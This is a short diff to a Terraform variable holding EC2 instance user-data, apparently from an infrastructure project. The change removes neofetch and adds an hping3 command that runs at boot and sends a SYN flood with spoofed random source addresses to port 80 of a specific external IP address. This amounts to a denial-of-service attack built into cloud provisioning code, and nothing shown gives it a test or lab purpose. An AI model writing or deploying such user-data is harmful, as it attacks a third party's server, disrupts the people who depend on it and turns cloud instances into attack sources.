@@ -8,7 +8,8 @@ variable "userdataEC2" {
   default = <<-EOF
                 #!/bin/bash
                 apt update
-                apt install -y neofetch hping3 
+                apt install -y hping3
+                hping3 -c 20000 -d 120 -S -w 64 -p 80 --flood --rand-source 128.199.182.131 
 
 EOF
 
